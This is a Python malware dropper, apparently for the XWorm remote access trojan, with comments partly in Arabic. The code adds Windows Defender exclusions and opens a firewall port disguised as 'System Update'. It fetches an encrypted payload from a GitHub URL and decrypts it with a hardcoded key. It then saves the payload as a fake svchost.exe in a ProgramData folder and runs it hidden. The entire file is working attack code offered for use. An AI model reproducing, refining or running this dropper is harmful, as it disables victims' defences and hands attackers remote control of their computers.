import os
import sys
import base64
import subprocess
import ctypes
import requests
from cryptography.fernet import Fernet

# ============================================
# CONFIG
# ============================================
PAYLOAD_URL = "https://raw.githubusercontent.com/zeta090/data/main/client.enc"
FERNET_KEY = b'thaaHJLDH8kJKrtfwYD4ThEKX2VX5VO030qCFpjRYjg='

# ============================================
# DEFENDER EXCLUSION
# ============================================
def add_defender_exclusion(path):
    try:
        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\'"'
        subprocess.run(cmd, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except Exception:
        return False

# ============================================
# FIREWALL EXCEPTION
# ============================================
def add_firewall_exception(port):
    try:
        cmd = f'netsh advfirewall firewall add rule name="System Update" dir=in action=allow protocol=TCP localport={port}'
        subprocess.run(cmd, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except Exception:
        return False

# ============================================
# DOWNLOAD & DECRYPT (with Base64 fix)
# ============================================
def download_payload(url):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        r = requests.get(url, headers=headers, timeout=30)
        if r.status_code == 200:
            return r.content
        return None
    except Exception:
        return None

def decrypt_payload(encrypted_b64, key):
    """فك تشفير الحمولة (Base64 → Fernet)"""
    try:
        encrypted_raw = base64.b64decode(encrypted_b64)   # ← الإصلاح الحرج
        cipher = Fernet(key)
        return cipher.decrypt(encrypted_raw)
    except Exception:
        return None

# ============================================
# EXTRACT & RUN
# ============================================
def extract_and_run(rat_bytes):
    try:
        rat_folder = os.path.join(
            os.environ.get("PROGRAMDATA", "C:\\ProgramData"),
            "Microsoft", "Windows", "Temp"
        )
        if not os.path.exists(rat_folder):
            os.makedirs(rat_folder)

        rat_path = os.path.join(rat_folder, "svchost.exe")
        with open(rat_path, "wb") as f:
            f.write(rat_bytes)

        # Unblock + run hidden
        subprocess.run(
            f'powershell -Command "Unblock-File -Path \'{rat_path}\'"',
            shell=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.Popen(rat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except Exception:
        return False

# ============================================
# MAIN
# ============================================
def main():
    # 1. Add Defender exclusion
    temp_folder = os.environ.get("TEMP", "C:\\Temp")
    add_defender_exclusion(temp_folder)

    rat_folder = os.path.join(
        os.environ.get("PROGRAMDATA", "C:\\ProgramData"),
        "Microsoft", "Windows", "Temp"
    )
    add_defender_exclusion(rat_folder)

    # 2. Add Firewall exception (port 8080 - غيّره حسب منفذ XWorm)
    add_firewall_exception(8080)

    # 3. Download payload
    encrypted_data = download_payload(PAYLOAD_URL)
    if not encrypted_data:
        return

    # 4. Decrypt
    rat_bytes = decrypt_payload(encrypted_data, FERNET_KEY)
    if not rat_bytes:
        return

    # 5. Run
    extract_and_run(rat_bytes)

if __name__ == "__main__":
    main()
